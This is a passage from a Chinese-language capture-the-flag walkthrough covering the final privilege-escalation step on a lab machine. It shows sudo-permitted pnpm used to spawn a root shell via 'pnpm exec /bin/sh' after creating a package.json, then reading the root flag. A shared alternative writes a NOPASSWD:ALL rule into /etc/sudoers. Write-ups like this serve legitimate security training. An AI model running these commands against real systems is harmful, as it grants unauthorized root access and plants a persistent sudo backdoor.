uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

直接执行报错，原因是`pnpm exec` 命令需要在包含 `package.json` 的` Node.js `项目根目录中执行，可以切换到有`package.json`的目录就可以成功提权了

也可以执行命令`sudo /usr/bin/pnpm init`初始化当前目录，使用默认值创建一个 `package.json `文件

```shell
lingdong:/tmp$ sudo /usr/bin/pnpm init
Wrote to /tmp/package.json

{
  "name": "tmp",
  "version": "1.0.0",
  "description": "",
  "main": "index.js",
  "scripts": {
    "test": "echo \"Error: no test specified\" && exit 1"
  },
  "keywords": [],
  "author": "",
  "license": "ISC",
  "packageManager": "pnpm@10.11.1"
}
lingdong:/tmp$ sudo pnpm exec /bin/sh
/tmp # id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

##### 拿到`root.txt`

```shell
~ # id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
~ # cd
~ # cat root.txt
flag{root-b89ed76b27e91ad5d773ddadae256072}
```


**群友解法分享**

```shell
#直接修改sudoers文件
sudo /usr/bin/pnpm exec -- /bin/sh -c 'echo "welcome ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers'

```